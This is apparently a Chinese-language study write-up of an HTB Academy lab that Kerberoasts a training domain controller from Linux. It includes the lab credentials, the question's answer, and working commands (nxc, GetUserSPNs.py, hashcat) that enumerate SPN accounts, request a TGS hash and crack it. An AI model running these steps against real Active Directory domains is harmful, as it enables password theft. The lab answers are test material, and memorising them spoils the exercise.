# Kerberoasting from Linux

> HTB Academy / Kerberos Attacks 模組
> 目標：`10.129.57.203`（ACADEMY-KERBATTCK-2-DC01）— **這次目標本身就是 DC**
> 授權帳號：`INLANEFREIGHT\htb-student : HTB_@cademy_stdnt!`

Kerberoasting：鎖定「有 `servicePrincipalName` 的服務帳號」。任何已認證的網域使用者都能向 KDC 要該服務的 **TGS-REP**，票券中有一段用該服務帳號的 NTLM hash 加密 → 離線爆破 → 拿到服務帳號明文密碼。

---

## 答案

| 題目 | 答案 |
|---|---|
| q1 Adam（Kerberoastable 帳號 `adam.jones`，SPN `IIS_dev/inlanefreight.local:80`）的密碼 | **`spongebob`** |

---

## 1. 偵察：確認目標是 DC、帳號可認證

```bash
ping -c1 -W2 10.129.57.203                     # up
nxc smb 10.129.57.203 -u htb-student -p 'HTB_@cademy_stdnt!'
# -> DC01 (name:DC01) (signing:True) (DC:True)   [+] 認證成功
```
`(DC:True)` → 這台就是 KDC。**和跳板版那個 lab 不同：這次 target 直接是 DC，88 直達，不用跳板**，從 Linux 直接打。

---

## 2. 列舉 Kerberoastable 帳號（有 SPN 的）

```bash
GetUserSPNs.py INLANEFREIGHT.LOCAL/htb-student:'HTB_@cademy_stdnt!' -dc-ip 10.129.57.203
```
```
ServicePrincipalName                     Name           Delegation
CIFS/fake.inlanefreight.local            callum.dixon   unconstrained
HTTP/DC01                                 beth.richards  constrained
MSSQL_svc_dev/inlanefreight.local:1433    sqldev
MSSQLSvc/SQL01:1433                        sqlprod
MSSQL_svc_qa/inlanefreight.local:1433     sqlqa
MSSQL_svc_test/inlanefreight.local:1433   sql-test
IIS_dev/inlanefreight.local:80            adam.jones
SVC/FILER02.inlanefreight.local           jacob.kelly
```
Adam = **`adam.jones`**（SPN `IIS_dev/inlanefreight.local:80`）。
> `callum.dixon`(unconstrained)、`beth.richards`(constrained) 另有委派設定，可延伸做 delegation 攻擊；本題只要 Adam。

---

## 3. 要 adam.jones 的 TGS 票（拿 hash）

```bash
GetUserSPNs.py INLANEFREIGHT.LOCAL/htb-student:'HTB_@cademy_stdnt!' -dc-ip 10.129.57.203 \
    -request-user adam.jones -outputfile adam.hash
# -> $krb5tgs$23$*adam.jones$INLANEFREIGHT.LOCAL$...
# 結尾 "CCache file is not found. Skipping..." 只是沒既有票快取，非錯誤
```

---

## 4. 離線爆破（TGS-REP = hashcat mode 13100）

```bash
hashcat -m 13100 -a 0 adam.hash /usr/share/wordlists/rockyou.txt -O
# -> $krb5tgs$23$*adam.jones$...:spongebob
```
`john` 等效：`john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt adam.hash`

---

## 5. 除錯重點

1. 先 `nxc smb <ip>` 看 `(DC:True)` 和 88/389：是 DC 就直打；只是工作站、DC 在內網的情況見 [Kerberoasting.md](Kerberoasting.md)（跳板版）。
2. `-dc-ip` 要指到真正的 KDC；指錯會逾時，先 `ip route get <ip>` 確認可達。
3. 不加 `-request`/`-request-user` 只會列清單、不產生 hash。
4. hash 模式別搞混：Kerberoast TGS-REP 用 `-m 13100`；AS-REProast AS-REP 用 `-m 18200`。
